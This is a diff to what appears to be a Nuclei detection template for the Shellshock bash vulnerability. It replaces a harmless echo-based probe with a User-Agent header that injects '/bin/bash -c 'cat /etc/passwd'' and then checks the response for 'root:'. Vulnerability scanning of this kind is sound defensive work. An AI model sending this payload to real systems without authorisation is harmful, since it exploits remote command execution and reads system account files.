@@ -7,15 +7,12 @@ info:
   description: Shellshock vulnerability detection
   tags: shellshock,bash,vulnerabilities
 
-variables:
-  rand: "{{randstr}}"
-
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/cgi-bin/vulnerable"
     headers:
-      User-Agent: '() { :; }; echo -e "Content-type: text/plain\n"; echo {{rand}} SHELLSHOCK VULNERABILITY NUCLEI; exit'
+      User-Agent: "() { :; }; echo; /bin/bash -c 'cat /etc/passwd'"
     matchers-condition: and
     matchers:
       - type: status
@@ -23,4 +20,4 @@ requests:
           - 200
       - type: dsl
         dsl:
-          - "contains(body, '{{rand}} SHELLSHOCK VULNERABILITY NUCLEI')"
+          - "contains(body, 'root:')"
